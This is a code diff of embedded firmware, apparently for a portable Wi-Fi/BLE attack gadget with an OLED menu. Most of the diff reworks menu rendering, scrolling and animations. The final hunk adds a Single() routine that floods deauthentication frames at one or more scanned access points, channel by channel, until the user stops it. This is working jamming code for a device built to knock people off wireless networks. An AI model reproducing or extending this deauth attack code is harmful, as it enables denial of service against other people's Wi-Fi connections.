+  if (delta != 1 && delta != -1) {
+    drawMenuBasePaged_NoFlush_Generic(items, itemCount, fromStartIndex);
+    display.display();
+    return;
+  }
+  const int delayPerStepMs = SELECT_MOVE_TOTAL_MS / ANIM_STEPS;
+  unsigned long nextStepDeadline = millis() + delayPerStepMs;
+  for (int s = 1; s <= ANIM_STEPS; s++) {
+    int offset = (HOME_ITEM_HEIGHT * s) / ANIM_STEPS; // 0..H
+    int dir = (delta > 0) ? 1 : -1; // +1: 内容上移；-1: 内容下移
+    int fromYOffset = (dir > 0) ? -offset : offset;
+    int toYOffset = (dir > 0) ? (HOME_ITEM_HEIGHT - offset) : -(HOME_ITEM_HEIGHT - offset);
+    display.clearDisplay();
+    if (dir > 0) {
+      drawMenuPageWithOffset_NoFlush_Generic(items, itemCount, toStartIndex, toYOffset);
+      drawMenuPageWithOffset_NoFlush_Generic(items, itemCount, fromStartIndex, fromYOffset);
+    } else {
+      drawMenuPageWithOffset_NoFlush_Generic(items, itemCount, fromStartIndex, fromYOffset);
+      drawMenuPageWithOffset_NoFlush_Generic(items, itemCount, toStartIndex, toYOffset);
+    }
+    float progress = (float)offset / (float)HOME_ITEM_HEIGHT;
+    float startIndexF = (float)fromStartIndex + progress * (float)delta;
+    drawScrollbarFractionGeneric(itemCount, HOME_PAGE_SIZE, startIndexF);
+    if ((s % DISPLAY_FLUSH_EVERY_FRAMES) == 0 || s == ANIM_STEPS) display.display();
+    if (delayPerStepMs > 0) {
+      while ((long)(millis() - nextStepDeadline) < 0) { }
+      nextStepDeadline += delayPerStepMs;
+    }
+  }
+}
+
+// 选择动画（通用）：使用通用基础绘制shim
+static const HomeMenuItem* g_genericMenuItems = nullptr;
+static int g_genericMenuCount = 0;
+static int g_genericBaseStartIndex = 0;
+static void drawGenericMenuBaseShim() { drawMenuBasePaged_NoFlush_Generic(g_genericMenuItems, g_genericMenuCount, g_genericBaseStartIndex); }
+// 前置声明：选择动画（在下方定义）
+static inline void animateSelectionGeneric(int yFrom, int yTo, int rectHeight, int cornerRadius, bool useFullWidth, bool doubleOutline, void (*drawBaseNoFlush)());
+static inline void animateMoveGenericMenu(int yFrom, int yTo, int rectHeight, int startIndex) {
+  g_genericBaseStartIndex = startIndex;
+  bool prev = g_forceScrollbarAlwaysForGeneric;
+  // 在BLE上下文中调用该动画时，外部会先设置 g_genericMenuItems/genericMenuCount
+  // 在动画期间强制显示占位滚动条，降低闪烁
+  g_forceScrollbarAlwaysForGeneric = (g_genericMenuItems == g_bleMenuItems);
+  animateSelectionGeneric(yFrom, yTo, rectHeight, 4, /*useFullWidth=*/false, /*doubleOutline=*/false, drawGenericMenuBaseShim);
+  g_forceScrollbarAlwaysForGeneric = prev;
+}
 
 // 内部辅助：绘制某页并整体添加y偏移（不刷新）。偏移允许为负/正，用于翻页过渡。
 static inline void drawHomePageWithOffset_NoFlush(int startIndex, int yOffset) {
@@ -3123,78 +3219,419 @@ void animateMoveHome(int yFrom, int yTo, int rectHeight, int startIndex) {
   animateSelectionGeneric(yFrom, yTo, rectHeight, 7, /*useFullWidth=*/false, /*doubleOutline=*/false, drawHomeMenuBasePagedShim);
 }
 
+// ===== Root menu (WIFI / BLE) =====
+void drawRootMenu() {
+  display.clearDisplay();
+  display.setTextSize(1);
+  
+  int totalHeight = (g_rootMenuCount * 22) + ((g_rootMenuCount - 1) * 4);
+  int startY = (display.height() - totalHeight) / 2;
+  
+  for (int i = 0; i < g_rootMenuCount; i++) {
+    int menuIndex = i;
+    if (menuIndex >= g_rootMenuCount) break;
+    
+    int rectY = startY + i * (22 + 4);
+    int rectX = 12;
+    int rectW = 104;
+    int rectH = 22;
+    
+    bool isSel = (i == rootState);
+    
+    if (isSel) {
+      display.drawRect(rectX, rectY, rectW, rectH, WHITE);
+      display.fillRect(rectX + 1, rectY + 1, rectW - 2, rectH - 2, WHITE);
+      
+      display.fillRect(rectX + 5, rectY + 8, 6, 6, BLACK);
+    } else {
+      display.drawRect(rectX, rectY, rectW, rectH, WHITE);
+      
+      display.drawRect(rectX + 5, rectY + 8, 6, 6, WHITE);
+    }
+    
+    String label = g_rootMenuItems[menuIndex].label;
+    String displayLabel = label;
+    bool isTruncated = false;
+    
+    const char* labelStr = label.c_str();
+    int textWidth = u8g2_for_adafruit_gfx.getUTF8Width(labelStr);
+    int maxTextWidth = rectW - 20;
+    
+    // 检测是否需要滚动
+    if (isSel && textWidth > maxTextWidth) {
+      isTruncated = true;
+      
+      // 如果还没开始滚动，开始计时
+      if (!g_scrollEnabled) {
+        g_scrollEnabled = true;
+        g_scrollStartTime = millis();
+        g_scrollLabel = label;
+        g_scrollOffset = 0;
+      }
+      
+      // 检查是否开始滚动
+      if (g_scrollEnabled && millis() - g_scrollStartTime >= SCROLL_DELAY_MS) {
+        // 计算滚动偏移
+        int scrollWidth = textWidth - maxTextWidth + SCROLL_LABEL_PADDING;
+        unsigned long elapsed = (millis() - g_scrollStartTime - SCROLL_DELAY_MS) / SCROLL_SPEED_MS;
+        g_scrollOffset = (elapsed * 2) % (scrollWidth + SCROLL_LABEL_PADDING);
+        
+        // 构建滚动显示的标签
+        displayLabel = " " + label + " ";
+        textWidth = u8g2_for_adafruit_gfx.getUTF8Width(displayLabel.c_str());
+      } else {
+        // 等待阶段，显示截断的标签
+        while (displayLabel.length() > 0 && 
+               u8g2_for_adafruit_gfx.getUTF8Width(displayLabel.c_str()) > maxTextWidth - 10) {
+          displayLabel.remove(displayLabel.length() - 1);
+          while (displayLabel.length() > 0 && ((uint8_t)displayLabel[displayLabel.length()-1] & 0xC0) == 0x80) {
+            displayLabel.remove(displayLabel.length() - 1);
+          }
+        }
+        displayLabel += "..";
+        textWidth = u8g2_for_adafruit_gfx.getUTF8Width(displayLabel.c_str());
+      }
+    }
+    
+    int textX;
+    if (isTruncated && g_scrollEnabled && millis() - g_scrollStartTime >= SCROLL_DELAY_MS) {
+      // 滚动显示
+      textX = rectX + 10 - g_scrollOffset;
+    } else {
+      // 正常居中显示
+      textX = rectX + (rectW - textWidth) / 2;
+    }
+    
+    int textY = rectY + (rectH + 8) / 2;
+    
+    u8g2_for_adafruit_gfx.setFontMode(1);
+    if (isSel) {
+      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
+    } else {
+      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+    }
+    u8g2_for_adafruit_gfx.setCursor(textX, textY);
+    u8g2_for_adafruit_gfx.print(displayLabel);
+  }
+  
+  display.display();
+}
+
+inline void setRootSelection(int startIndex, int state) {
+  rootStartIndex = startIndex;
+  rootState = state;
+}
+
+inline void rootMoveUp(unsigned long currentTime) {
+  if (currentTime - lastDownTime <= DEBOUNCE_DELAY) return;
+  if (rootState > 0) setRootSelection(rootStartIndex, rootState - 1);
+  lastDownTime = currentTime;
+}
+inline void rootMoveDown(unsigned long currentTime) {
+  if (currentTime - lastUpTime <= DEBOUNCE_DELAY) return;
+  if (rootState < g_rootMenuCount - 1) setRootSelection(rootStartIndex, rootState + 1);
+  lastUpTime = currentTime;
+}
+inline void handleRootOk() {
+  if (digitalRead(BTN_OK) != LOW) return; delay(200);
+  int idx = rootStartIndex + rootState;
+  if (idx >= 0 && idx < g_rootMenuCount && g_rootMenuItems[idx].action) g_rootMenuItems[idx].action();
+}
+
+// ===== BLE submenu =====
+// BLE 子菜单改为复用通用菜单绘制与动画
+static bool g_bleSkipNextSelectAnim = false;
+void drawBleMenu() {
+  static int prevBleState = -1;
+  
+  g_genericMenuItems = g_bleMenuItems;
+  g_genericMenuCount = g_bleMenuCount;
+  g_genericBaseStartIndex = bleStartIndex;
+  
+  if (prevBleState == -1) prevBleState = bleState;
+  
+  if (!g_bleSkipNextSelectAnim && prevBleState != bleState) {
+    int yFrom = HOME_Y_OFFSET + prevBleState * HOME_ITEM_HEIGHT;
+    int yTo   = HOME_Y_OFFSET + bleState   * HOME_ITEM_HEIGHT;
+    animateMoveGenericMenu(yFrom, yTo, HOME_RECT_HEIGHT, bleStartIndex);
+    prevBleState = bleState;
+    // 重置滚动状态
+    g_scrollEnabled = false;
+    g_scrollOffset = 0;
+  } else if (g_bleSkipNextSelectAnim) {
+    prevBleState = bleState;
+    g_bleSkipNextSelectAnim = false;
+    g_scrollEnabled = false;
+    g_scrollOffset = 0;
+  }
+  
+  display.clearDisplay();
+  display.setTextSize(1);
+  
+  int currentPageItems = (HOME_PAGE_SIZE < (g_bleMenuCount - bleStartIndex)) ? HOME_PAGE_SIZE : (g_bleMenuCount - bleStartIndex);
+  
+  for (int i = 0; i < currentPageItems; i++) {
+    int menuIndex = bleStartIndex + i;
+    if (menuIndex >= g_bleMenuCount) break;
+    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT;
+    int textY = rectY + 14;
+    bool isSel = (i == bleState);
+    
+    String label = g_bleMenuItems[menuIndex].label;
+    String displayLabel = label;
+    bool isTruncated = false;
+    
+    int maxTextWidth = display.width() - UI_RIGHT_GUTTER - 25;
+    int labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
+    
+    // 检测是否需要滚动
+    if (isSel && labelWidth > maxTextWidth) {
+      isTruncated = true;
+      
+      // 如果还没开始滚动，开始计时
+      if (!g_scrollEnabled) {
+        g_scrollEnabled = true;
+        g_scrollStartTime = millis();
+        g_scrollLabel = label;
+        g_scrollOffset = 0;
+      }
+      
+      // 检查是否开始滚动
+      if (g_scrollEnabled && millis() - g_scrollStartTime >= SCROLL_DELAY_MS) {
+        // 计算滚动偏移
+        int scrollWidth = labelWidth - maxTextWidth + SCROLL_LABEL_PADDING;
+        unsigned long elapsed = (millis() - g_scrollStartTime - SCROLL_DELAY_MS) / SCROLL_SPEED_MS;
+        g_scrollOffset = (elapsed * 2) % (scrollWidth + SCROLL_LABEL_PADDING);
+        
+        // 构建滚动显示的标签
+        displayLabel = " " + label + " ";
+        labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(displayLabel.c_str());
+      } else {
+        // 等待阶段，显示截断的标签
+        while (displayLabel.length() > 0 && 
+               u8g2_for_adafruit_gfx.getUTF8Width(displayLabel.c_str()) > maxTextWidth - 20) {
+          displayLabel.remove(displayLabel.length() - 1);
+          while (displayLabel.length() > 0 && ((uint8_t)displayLabel[displayLabel.length()-1] & 0xC0) == 0x80) {
+            displayLabel.remove(displayLabel.length() - 1);
+          }
+        }
+        displayLabel += "..";
+      }
+    } else if (labelWidth > maxTextWidth) {
+      // 非选中状态，显示截断
+      while (displayLabel.length() > 0 && 
+             u8g2_for_adafruit_gfx.getUTF8Width(displayLabel.c_str()) > maxTextWidth - 20) {
+        displayLabel.remove(displayLabel.length() - 1);
+        while (displayLabel.length() > 0 && ((uint8_t)displayLabel[displayLabel.length()-1] & 0xC0) == 0x80) {
+          displayLabel.remove(displayLabel.length() - 1);
+        }
+      }
+      displayLabel += "..";
+    }
+    
+    if (isSel) {
+      display.drawRect(0, rectY, display.width() - UI_RIGHT_GUTTER, HOME_RECT_HEIGHT, WHITE);
+      display.fillRect(1, rectY + 1, display.width() - UI_RIGHT_GUTTER - 2, HOME_RECT_HEIGHT - 2, WHITE);
+      
+      display.fillRect(4, rectY + 6, 3, 6, BLACK);
+      
+      u8g2_for_adafruit_gfx.setFontMode(1);
+      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
+      
+      if (isTruncated && g_scrollEnabled && millis() - g_scrollStartTime >= SCROLL_DELAY_MS) {
+        // 滚动显示
+        int scrollX = 12 - g_scrollOffset;
+        u8g2_for_adafruit_gfx.setCursor(scrollX, textY);
+      } else {
+        // 正常显示
+        u8g2_for_adafruit_gfx.setCursor(12, textY);
+      }
+      u8g2_for_adafruit_gfx.print(displayLabel);
+    } else {
+      display.drawRect(0, rectY, display.width() - UI_RIGHT_GUTTER, HOME_RECT_HEIGHT, WHITE);
+      
+      display.drawRect(4, rectY + 6, 3, 6, WHITE);
+      
+      u8g2_for_adafruit_gfx.setFontMode(1);
+      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+      u8g2_for_adafruit_gfx.setCursor(12, textY);
+      u8g2_for_adafruit_gfx.print(displayLabel);
+    }
+    
+    drawRightChevron(rectY, HOME_RECT_HEIGHT, isSel);
+  }
+  
+  drawHomeScrollbar(bleStartIndex);
+  display.display();
+}
+inline void setBleSelection(int startIndex, int state) { bleStartIndex = startIndex; bleState = state; }
+// BLE 上/下移动复用通用逻辑（带翻页动画）
+inline void bleMoveUp(unsigned long currentTime) {
+  if (currentTime - lastDownTime <= DEBOUNCE_DELAY) return;
+  if (bleState > 0) {
+    setBleSelection(bleStartIndex, bleState - 1);
+  } else if (bleStartIndex > 0) {
+    int prevStart = bleStartIndex;
+    setBleSelection(bleStartIndex - 1, 0);
+    animateMenuPageFlip_Generic(g_bleMenuItems, g_bleMenuCount, prevStart, bleStartIndex);
+    g_bleSkipNextSelectAnim = true;
+  }
+  lastDownTime = currentTime;
+}
+inline void bleMoveDown(unsigned long currentTime) {
+  if (currentTime - lastUpTime <= DEBOUNCE_DELAY) return;
+  int currentPageItems = (HOME_PAGE_SIZE < (g_bleMenuCount - bleStartIndex)) ? HOME_PAGE_SIZE : (g_bleMenuCount - bleStartIndex);
+  if (bleState < currentPageItems - 1) {
+    setBleSelection(bleStartIndex, bleState + 1);
+  } else if (bleStartIndex + bleState + 1 < g_bleMenuCount) {
+    int prevStart = bleStartIndex;
+    int nextStartIndex = bleStartIndex + 1;
+    int nextPageItems = (HOME_PAGE_SIZE < (g_bleMenuCount - nextStartIndex)) ? HOME_PAGE_SIZE : (g_bleMenuCount - nextStartIndex);
+    int nextState = (nextPageItems > 0) ? (nextPageItems - 1) : 0;
+    setBleSelection(nextStartIndex, nextState);
+    animateMenuPageFlip_Generic(g_bleMenuItems, g_bleMenuCount, prevStart, nextStartIndex);
+    g_bleSkipNextSelectAnim = true;
+  }
+  lastUpTime = currentTime;
+}
+inline void handleBleOk() {
+  if (digitalRead(BTN_OK) != LOW) return; delay(200);
+  int idx = bleStartIndex + bleState;
+  if (idx >= 0 && idx < g_bleMenuCount && g_bleMenuItems[idx].action) g_bleMenuItems[idx].action();
+}
+
+// ===== Existing WiFi submenu (Home menu) =====
 void drawHomeMenu() {
   static int prevState = -1;
-  // const int MAX_DISPLAY_ITEMS = 3; // 保持每页３项 - 未使用的变量
 
   int startIndex = homeStartIndex;
   g_homeBaseStartIndex = startIndex;
 
+  g_genericMenuItems = g_homeMenuItems;
+  g_genericMenuCount = g_homeMenuCount;
+  g_genericBaseStartIndex = startIndex;
+
   if (prevState == -1) prevState = homeState;
 
-  // 只在选择项改变时播放选择动画，翻页动画由loop函数处理
   if (!g_skipNextSelectAnim && prevState != homeState) {
     int yFrom = HOME_Y_OFFSET + prevState * HOME_ITEM_HEIGHT;
     int yTo = HOME_Y_OFFSET + homeState * HOME_ITEM_HEIGHT;
-    // 使用与攻击页完全一致的动画效果
-    animateMove(yFrom, yTo, HOME_RECT_HEIGHT, drawHomeMenuBasePagedShim);
+    animateMoveGenericMenu(yFrom, yTo, HOME_RECT_HEIGHT, startIndex);
     prevState = homeState;
+    // 重置滚动状态
+    g_scrollEnabled = false;
+    g_scrollOffset = 0;
   } else if (g_skipNextSelectAnim) {
-    // 跳过一次选择动画后立即恢复
     prevState = homeState;
     g_skipNextSelectAnim = false;
+    g_scrollEnabled = false;
+    g_scrollOffset = 0;
   }
 
   display.clearDisplay();
   display.setTextSize(1);
-  // 计算当前页实际显示的项目数量
+  
   int currentPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - startIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - startIndex);
+  
   for (int i = 0; i < currentPageItems; i++) {
     int menuIndex = startIndex + i;
     if (menuIndex >= HOME_MAX_ITEMS) break;
     int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT;
-    int textY = rectY + 13; // 主菜单文字整体下移2px
+    int textY = rectY + 14;
     bool isSel = (i == homeState);
     
-    // 获取并裁剪标签，防止文字超出选择框范围
     String label = g_homeMenuItems[menuIndex].label;
-    int maxTextWidth = display.width() - UI_RIGHT_GUTTER - 15; // 留出箭头和边距
+    String displayLabel = label;
+    bool isTruncated = false;
+    
+    int maxTextWidth = display.width() - UI_RIGHT_GUTTER - 25;
     int labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
     
-    if (labelWidth > maxTextWidth) {
-      // UTF-8安全裁剪
-      while (label.length() > 0 && 
-             u8g2_for_adafruit_gfx.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
-        // 移除最后一个字符（UTF-8安全）
-        label.remove(label.length() - 1);
-        // 跳过UTF-8续字节
-        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) {
-          label.remove(label.length() - 1);
+    // 检测是否需要滚动
+    if (isSel && labelWidth > maxTextWidth) {
+      isTruncated = true;
+      
+      // 如果还没开始滚动，开始计时
+      if (!g_scrollEnabled) {
+        g_scrollEnabled = true;
+        g_scrollStartTime = millis();
+        g_scrollLabel = label;
+        g_scrollOffset = 0;
+      }
+      
+      // 检查是否开始滚动
+      if (g_scrollEnabled && millis() - g_scrollStartTime >= SCROLL_DELAY_MS) {
+        // 计算滚动偏移
+        int scrollWidth = labelWidth - maxTextWidth + SCROLL_LABEL_PADDING;
+        unsigned long elapsed = (millis() - g_scrollStartTime - SCROLL_DELAY_MS) / SCROLL_SPEED_MS;
+        g_scrollOffset = (elapsed * 2) % (scrollWidth + SCROLL_LABEL_PADDING);
+        
+        // 构建滚动显示的标签
+        displayLabel = " " + label + " ";
+        labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(displayLabel.c_str());
+      } else {
+        // 等待阶段，显示截断的标签
+        while (displayLabel.length() > 0 && 
+               u8g2_for_adafruit_gfx.getUTF8Width(displayLabel.c_str()) > maxTextWidth - 20) {
+          displayLabel.remove(displayLabel.length() - 1);
+          while (displayLabel.length() > 0 && ((uint8_t)displayLabel[displayLabel.length()-1] & 0xC0) == 0x80) {
+            displayLabel.remove(displayLabel.length() - 1);
+          }
+        }
+        displayLabel += "..";
+      }
+    } else if (labelWidth > maxTextWidth) {
+      // 非选中状态，显示截断
+      while (displayLabel.length() > 0 && 
+             u8g2_for_adafruit_gfx.getUTF8Width(displayLabel.c_str()) > maxTextWidth - 20) {
+        displayLabel.remove(displayLabel.length() - 1);
+        while (displayLabel.length() > 0 && ((uint8_t)displayLabel[displayLabel.length()-1] & 0xC0) == 0x80) {
+          displayLabel.remove(displayLabel.length() - 1);
         }
       }
-      label += "..";
+      displayLabel += "..";
     }
     
     if (isSel) {
-      // 使用与攻击页完全一致的高亮效果（减去右侧滚动条区域避免覆盖）
-      display.fillRoundRect(0, rectY, display.width() - UI_RIGHT_GUTTER, HOME_RECT_HEIGHT, 4, SSD1306_WHITE);
+      display.drawRect(0, rectY, display.width() - UI_RIGHT_GUTTER, HOME_RECT_HEIGHT, WHITE);
+      display.fillRect(1, rectY + 1, display.width() - UI_RIGHT_GUTTER - 2, HOME_RECT_HEIGHT - 2, WHITE);
+      
+      display.fillRect(4, rectY + 6, 3, 6, BLACK);
+      
       u8g2_for_adafruit_gfx.setFontMode(1);
       u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
-      u8g2_for_adafruit_gfx.setCursor(5, textY + 1);
-      u8g2_for_adafruit_gfx.print(label);
+      
+      if (isTruncated && g_scrollEnabled && millis() - g_scrollStartTime >= SCROLL_DELAY_MS) {
+        // 滚动显示
+        int scrollX = 12 - g_scrollOffset;
+        u8g2_for_adafruit_gfx.setCursor(scrollX, textY);
+      } else {
+        // 正常显示
+        u8g2_for_adafruit_gfx.setCursor(12, textY);
+      }
+      u8g2_for_adafruit_gfx.print(displayLabel);
     } else {
+      display.drawRect(0, rectY, display.width() - UI_RIGHT_GUTTER, HOME_RECT_HEIGHT, WHITE);
+      
+      display.drawRect(4, rectY + 6, 3, 6, WHITE);
+      
       u8g2_for_adafruit_gfx.setFontMode(1);
       u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-      u8g2_for_adafruit_gfx.setCursor(5, textY + 1);
-      u8g2_for_adafruit_gfx.print(label);
+      u8g2_for_adafruit_gfx.setCursor(12, textY);
+      u8g2_for_adafruit_gfx.print(displayLabel);
     }
-    // 使用与攻击页完全一致的右箭头指示器
+    
     drawRightChevron(rectY, HOME_RECT_HEIGHT, isSel);
   }
-  // 绘制滚动条
+  
   drawHomeScrollbar(startIndex);
   display.display();
 }
+
+// Root enter actions
+void rootActionEnterRoot() { g_menuMode = MENU_ROOT; setRootSelection(0, 0); }
+void rootActionEnterWifi() { g_menuMode = MENU_WIFI; setHomeSelection(0, 0); }
+void rootActionEnterBle()  { g_menuMode = MENU_BLE;  setBleSelection(0, 0); }
 
 // 首页菜单：统一同步选择状态到全局，并更新基础绘制起始索引
 inline void setHomeSelection(int startIndex, int state) {
@@ -3213,7 +3650,8 @@ inline void homeMoveUp(unsigned long currentTime) {
     // 向上滚动一项
     int prevStart = homeStartIndex;
     setHomeSelection(homeStartIndex - 1, 0);
-    animateHomePageFlip(prevStart, homeStartIndex);
+    // 使用通用菜单翻页动画
+    animateMenuPageFlip_Generic(g_homeMenuItems, g_homeMenuCount, prevStart, homeStartIndex);
     g_skipNextSelectAnim = true;
   }
   lastDownTime = currentTime;
@@ -3235,7 +3673,8 @@ inline void homeMoveDown(unsigned long currentTime) {
     // 设置homeState为最后一行的索引（确保在新页范围内）
     int nextHomeState = (nextPageItems > 0) ? (nextPageItems - 1) : 0;
     setHomeSelection(nextStartIndex, nextHomeState);
-    animateHomePageFlip(prevStart, nextStartIndex);
+    // 使用通用菜单翻页动画
+    animateMenuPageFlip_Generic(g_homeMenuItems, g_homeMenuCount, prevStart, nextStartIndex);
     g_skipNextSelectAnim = true;
   }
   // 当到达最后一页的最后一个项目时，不执行任何操作（阻止继续向下移动）
@@ -3463,7 +3902,11 @@ void drawssid() {
     // 根据当前选择数量动态计算是否"全选"
     allSelected = (SelectedVector.size() == scan_results.size() && !scan_results.empty());
     
-    if(digitalRead(BTN_BACK)==LOW) break;
+    if(digitalRead(BTN_BACK)==LOW) {
+      // 等待按键释放，避免主循环立即检测到返回键
+      while(digitalRead(BTN_BACK) == LOW) { delay(10); }
+      return;
+    }
     
     if(digitalRead(BTN_OK) == LOW) {
       delay(400);
@@ -3960,294 +4403,205 @@ void updateScanDisplay(const char* scanType) {
   
   display.display();
 }
-// ============ 非阻塞攻击处理函数 ============
-// 处理信道桶的状态机 - 增强版
-void processChannelBuckets() {
-  // 状态机处理信道桶
-  if (g_deauthState.currentChannelBucketIndex >= channelBucketsCache.buckets.size()) {
-    g_deauthState.currentChannelBucketIndex = 0;
-    return;
-  }
+void Single() {
+  Serial.println("=== 启动单一攻击 ===");
+  Serial.println("攻击模式: 单一攻击");
+  Serial.println("攻击强度: " + String(perdeauth));
   
-  auto& bucket = channelBucketsCache.buckets[g_deauthState.currentChannelBucketIndex];
-  if (bucket.empty()) {
-    g_deauthState.currentChannelBucketIndex++;
-    return;
-  }
+  showAttackStatusPage("单一攻击中");
   
-  // 设置信道一次，处理该桶的所有BSSID
-  if (g_deauthState.currentBssidIndexInBucket == 0) {
-    setChannelOptimized(allChannels[g_deauthState.currentChannelBucketIndex]);
-  }
-  
-  // 处理当前BSSID
-  if (g_deauthState.currentBssidIndexInBucket < bucket.size()) {
-    sendDeauthBatch(bucket[g_deauthState.currentBssidIndexInBucket], 
-                    g_deauthState.packetsPerCycle, 
-                    g_deauthState.packetCount);
-    g_deauthState.currentBssidIndexInBucket++;
-  } else {
-    // 当前桶处理完，移到下一个
-    g_deauthState.currentBssidIndexInBucket = 0;
-    g_deauthState.currentChannelBucketIndex++;
-  }
-}
+  // LED控制：红灯闪烁
+  startAttackLED();
 
-// 增强版信道桶处理 - 一次处理完整信道桶
-void processChannelBucketsEnhanced() {
-  // 检查是否处理完所有桶
-  if (g_deauthState.currentChannelBucketIndex >= channelBucketsCache.buckets.size()) {
-    // 处理extras信道
-    if (g_deauthState.currentTargetIndex < channelBucketsCache.extras.size()) {
-      auto& eb = channelBucketsCache.extras[g_deauthState.currentTargetIndex];
-      if (!eb.bssids.empty()) {
-        setChannelOptimized(eb.channel);
-        for (const uint8_t *bssidPtr : eb.bssids) {
-          if (g_enhancedDeauthMode) {
-            sendDeauthBatchEnhanced(bssidPtr, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
-          } else {
-            sendDeauthBatch(bssidPtr, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
+  int packetCount = 0;
+  
+  while (true) {
+    // 更新攻击状态显示
+    showAttackStatusPage("单一攻击中");
+    
+    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
+      digitalWrite(LED_R, LOW);
+      digitalWrite(LED_G, LOW);
+      digitalWrite(LED_B, LOW);
+      delay(200);
+      // 显示确认弹窗
+      if (showConfirmModal("确认停止攻击")) {
+        return; // 确认停止攻击
+      }
+      // 取消则继续攻击，重新启动LED
+      startAttackLED();
+    }
+    
+    if (SelectedVector.empty()) {
+      // 单目标：直接对当前高亮网络进行burst发送
+      wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
+      sendDeauthBurstToBssid(scan_results[scrollindex].bssid, perdeauth, packetCount, 0);
+      if (packetCount >= 1000) {
+        digitalWrite(LED_R, HIGH);
+        delay(50);
+        digitalWrite(LED_R, LOW);
+        packetCount = 0;
+      }
+    } else {
+      // 多目标：按信道分组，减少频繁切换信道（复用缓存）
+      channelBucketsCache.clearBuckets();
+      for (int selectedIndex : SelectedVector) {
+        if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
+          channelBucketsCache.add(scan_results[selectedIndex].channel,
+                                  scan_results[selectedIndex].bssid);
+        }
+      }
+      const unsigned int interFrameDelayUs = 250; // 微秒级细微延时
+      for (size_t chIdx = 0; chIdx < channelBucketsCache.buckets.size(); chIdx++) {
+        if (channelBucketsCache.buckets[chIdx].empty()) continue;
+        wext_set_channel(WLAN0_NAME, allChannels[chIdx]);
+        for (const uint8_t *bssidPtr : channelBucketsCache.buckets[chIdx]) {
+          if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
+            digitalWrite(LED_R, LOW);
+            digitalWrite(LED_G, LOW);
+            digitalWrite(LED_B, LOW);
+            delay(200);
+            // 显示确认弹窗
+            if (showConfirmModal("确认停止攻击")) {
+              return; // 确认停止攻击
+            }
+            // 取消则继续攻击，重新启动LED
+            startAttackLED();
+          }
+          sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);
+          if (packetCount >= 1000) {
+            digitalWrite(LED_R, HIGH);
+            delay(50);
+            digitalWrite(LED_R, LOW);
+            packetCount = 0;
           }
         }
       }
-      g_deauthState.currentTargetIndex++;
-    } else {
-      // 全部处理完，重置并开始新一轮
-      g_deauthState.currentChannelBucketIndex = 0;
-      g_deauthState.currentTargetIndex = 0;
-    }
-    return;
-  }
-  
-  auto& bucket = channelBucketsCache.buckets[g_deauthState.currentChannelBucketIndex];
-  if (bucket.empty()) {
-    g_deauthState.currentChannelBucketIndex++;
-    return;
-  }
-  
-  // 设置信道
-  setChannelOptimized(allChannels[g_deauthState.currentChannelBucketIndex]);
-  
-  // 一次处理该信道的所有BSSID（而不是只处理一个）
-  for (const uint8_t *bssidPtr : bucket) {
-    if (g_enhancedDeauthMode) {
-      sendDeauthBatchEnhanced(bssidPtr, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
-    } else {
-      sendDeauthBatch(bssidPtr, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
-    }
-  }
-  
-  // 移到下一个信道桶
-  g_deauthState.currentChannelBucketIndex++;
-}
-
-// 启动单一攻击
-void startSingleAttack() {
-  g_deauthState.mode = ATTACK_SINGLE;
-  g_deauthState.running = true;
-  g_deauthState.currentTargetIndex = 0;
-  g_deauthState.packetCount = 0;
-  g_deauthState.lastPacketMs = 0;
-  g_deauthState.lastUIUpdateMs = 0;
-  g_deauthState.lastButtonCheckMs = 0;
-  g_deauthState.lastLEDToggleMs = 0;
-  g_deauthState.ledState = false;
-  g_deauthState.packetsPerCycle = perdeauth;
-  g_deauthState.uiUpdateInterval = 500;
-  g_deauthState.buttonCheckInterval = 100;
-  g_deauthState.ledBlinkInterval = 500;
-  g_deauthState.channelSet = false;
-  g_deauthState.lastChannel = -1;
-  
-  // 预处理目标列表（如需要）
-  if (!SelectedVector.empty()) {
-    channelBucketsCache.clearBuckets();
-    for (int idx : SelectedVector) {
-      if (idx >= 0 && idx < (int)scan_results.size()) {
-        channelBucketsCache.add(scan_results[idx].channel, scan_results[idx].bssid);
+      // 处理未在 allChannels 中的信道
+      for (const auto &eb : channelBucketsCache.extras) {
+        if (eb.bssids.empty()) continue;
+        wext_set_channel(WLAN0_NAME, eb.channel);
+        for (const uint8_t *bssidPtr : eb.bssids) {
+          if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
+            digitalWrite(LED_R, LOW);
+            digitalWrite(LED_G, LOW);
+            digitalWrite(LED_B, LOW);
+            delay(200);
+            // 显示确认弹窗
+            if (showConfirmModal("确认停止攻击")) {
+              return; // 确认停止攻击
+            }
+            // 取消则继续攻击，重新启动LED
+            startAttackLED();
+          }
+          sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);
+          if (packetCount >= 1000) {
+            digitalWrite(LED_R, HIGH);
+            delay(50);
+            digitalWrite(LED_R, LOW);
+            packetCount = 0;
+          }
+        }
       }
     }
-    g_deauthState.currentChannelBucketIndex = 0;
